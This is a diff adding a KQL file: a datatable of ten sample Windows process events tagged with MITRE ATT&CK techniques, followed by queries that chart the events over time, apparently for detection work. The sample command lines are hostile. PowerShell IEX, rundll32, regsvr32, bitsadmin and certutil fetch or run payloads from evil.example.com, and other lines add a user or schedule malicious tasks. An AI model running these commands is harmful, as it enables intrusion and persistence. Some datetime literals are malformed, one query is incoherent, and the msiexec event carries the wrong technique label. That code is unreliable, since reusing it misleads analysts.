@@ -1,0 +1,161 @@
+let process_events = datatable(EventData: dynamic)
+[
+dynamic({
+    "Timestamp": datetime(2022-04-01T12: 01: 00.000Z),
+    "DeviceId": "Device001",
+    "ProcessId": 5678,
+    "ProcessCommandLine": "msiexec.exe /fa maliciousapp.msi /quiet",
+    "FileName": "msiexec.exe",
+    "FolderPath": "C:\\Windows\\system32",
+    "EventType": "T1021 - Remote Services",
+    "Severity": "Medium",
+    "IsAuditRecord": true
+}),
+dynamic({
+    "Timestamp": datetime(2022-04-02T12: 02: 00.000Z),
+    "DeviceId": "Device002",
+    "ProcessId": 2345,
+    "ProcessCommandLine": "powershell.exe -exec bypass -c 'IEX (iwr \"https://evil.example.com/malware.ps1\")'",
+    "FileName": "powershell.exe",
+    "FolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
+    "EventType": "T1059 - Command and Scripting Interpreter",
+    "Severity": "High",
+    "IsAuditRecord": true
+}),
+dynamic({
+    "Timestamp": datetime(2022-04-03T12: 03: 00.000Z),
+    "DeviceId": "Device003",
+    "ProcessId": 3456,
+    "ProcessCommandLine": "net user /add badguy",
+    "FileName": "net.exe",
+    "FolderPath": "C:\\Windows\\system32",
+    "EventType": "T1136 - Create Account",
+    "Severity": "Medium",
+    "IsAuditRecord": true
+}),
+dynamic({
+    "Timestamp": datetime(2022-04-03T12: 04: 00.000Z),
+    "DeviceId": "Device004",
+    "ProcessId": 4567,
+    "ProcessCommandLine": "schtasks /create /tn mytask /tr \"C:\\malicious\\mytask.exe\" /sc minute /mo 5",
+    "FileName": "schtasks.exe",
+    "FolderPath": "C:\\Windows\\system32",
+    "EventType": "T1053 - Scheduled Task",
+    "Severity": "Medium",
+    "IsAuditRecord": true
+}),
+dynamic({
+    "Timestamp": datetime(2022-04-04T12: 05: 00.000Z),
+    "DeviceId": "Device005",
+    "ProcessId": 6789,
+    "ProcessCommandLine": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//evil.example.com/malicious.sct\")\"",
+    "FileName": "rundll32.exe",
+    "FolderPath": "C:\\Windows\\system32",
+    "EventType": "T1085 - Rundll32",
+    "Severity": "High",
+    "IsAuditRecord": true
+}),
+dynamic({
+    "Timestamp": datetime(2022-04-06T12: 06: 00.000Z),
+    "DeviceId": "Device006",
+    "ProcessId": 7890,
+    "ProcessCommandLine": "bitsadmin.exe /transfer job_name /download /priority foreground https[:]//evil.example.com/malware.exe C:\\temp\\malware.exe",
+    "FileName": "bitsadmin.exe",
+    "FolderPath": "C:\\Windows\\system32",
+    "EventType": "T1197 - BITS Jobs",
+    "Severity": "Medium",
+    "IsAuditRecord": true
+}),
+dynamic({
+    "Timestamp": datetime(2022-04-07T12: 07: 00.000Z),
+    "DeviceId": "Device007",
+    "ProcessId": 8912,
+    "ProcessCommandLine": "wmic process call create 'C:\\temp\\malware.exe'",
+    "FileName": "wmic.exe",
+    "FolderPath": "C:\\Windows\\system32",
+    "EventType": "T1047 - Windows Management Instrumentation",
+    "Severity": "Medium",
+    "IsAuditRecord": true
+}),
+dynamic({
+    "Timestamp": datetime(2022-04-07T12: 08: 00.000Z),
+    "DeviceId": "Device008",
+    "ProcessId": 9012,
+    "ProcessCommandLine": "regsvr32 /s /n /u /i:http[:]//evil.example.com/malicious.sct scrobj.dll",
+    "FileName": "regsvr32.exe",
+    "FolderPath": "C:\\Windows\\system32",
+    "EventType": "T1117 - Regsvr32",
+    "Severity": "Medium",
+    "IsAuditRecord": true
+}),
+dynamic({
+    "Timestamp": datetime(2022-04-0712: 09: 00.000Z),
+    "DeviceId": "Device009",
+    "ProcessId": 1013,
+    "ProcessCommandLine": "certutil.exe -urlcache -split -f http[:]//evil.example.com/malware.exe C:\\temp\\malware.exe",
+    "FileName": "certutil.exe",
+    "FolderPath": "C:\\Windows\\system32",
+    "EventType": "T1140 - Deobfuscate/Decode Files or Information",
+    "Severity": "Medium",
+    "IsAuditRecord": true
+}),
+dynamic({
+    "Timestamp": datetime(2022-04-10T12: 10: 00.000Z),
+    "DeviceId": "Device010",
+    "ProcessId": 2023,
+    "ProcessCommandLine": "at 09:00 /every:M,T,W,Th,F,S,Su C:\\temp\\malicious.bat",
+    "FileName": "at.exe",
+    "FolderPath": "C:\\Windows\\system32",
+    "EventType": "T1053.005 - Scheduled Task/Job: At (Windows)",
+    "Severity": "Medium",
+    "IsAuditRecord": true
+})
+
+
+
+
+
+];
+process_events
+| extend Timestamp = todatetime(EventData.Timestamp), EventType = tostring(EventData.EventType)
+| summarize count() by EventType, bin(Timestamp, 1h)
+| render timechart
+
+
+
+process_events
+| extend Timestamp = todatetime(EventData.Timestamp), EventType = tostring(EventData.EventType)
+| summarize count() by bin(Timestamp, 1h), EventType
+| render timechart
+
+
+process_events
+| extend Date = startofday(todatetime(EventData.Timestamp)), EventType = tostring(EventData.EventType)
+| summarize count() by Date, EventType
+| render timechart
+
+
+
+
+process_events
+| extend Date = startofday(todatetime(EventData.Timestamp)), EventType = tostring(EventData.EventType)
+| summarize count() by Date, EventType
+| order by Date asc, EventType asc
+| serialize
+| extend next_count = next(count_, 1, EventType)
+| extend y0 = range(0, count_, 1)
+| extend y1 = range(0, next_count, 1)
+| extend series = strcat(EventType, " (", string(count_), ")")
+| mvexpand y0 to typeof(datetime), y1 to typeof(datetime)
+| project Date, y0, y1, series
+| render areachart kind=stacked
+
+
+process_events
+| extend Date = startofday(todatetime(EventData.Timestamp)), EventType = tostring(EventData.EventType)
+| summarize count_ = count() by Date, EventType
+| order by Date asc, EventType asc
+| extend series = strcat(EventType, " (", tostring(count_), ")")
+| project Date, count_, series
+| render areachart kind=stacked
+
